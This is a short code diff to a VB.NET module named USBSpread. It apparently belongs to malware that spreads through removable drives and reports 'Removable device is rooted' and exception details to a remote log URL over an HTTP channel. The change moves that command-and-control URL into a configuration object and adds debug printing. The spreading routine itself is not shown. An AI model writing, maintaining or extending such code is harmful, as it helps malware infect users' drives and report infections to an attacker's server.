@@ -30,7 +30,10 @@ Module USBSpread
                             .Message = "Removable device is rooted.",
                             .Type = "Info"
                         }
-                        http.TalkChannelHTTP(log, LogUrl)
+                        http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl)
+                        If Config.Variables.Debug Then
+                            Console.WriteLine("Removable device is rooted.")
+                        End If
                     Finally
 
                     End Try
@@ -43,7 +46,7 @@ Module USBSpread
                  .Message = "Exception: " & ex.ToString(),
                  .Type = "Error"
             }
-            http.TalkChannelHTTP(log, LogUrl)
+            http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl)
         End Try
     End Sub
 End Module
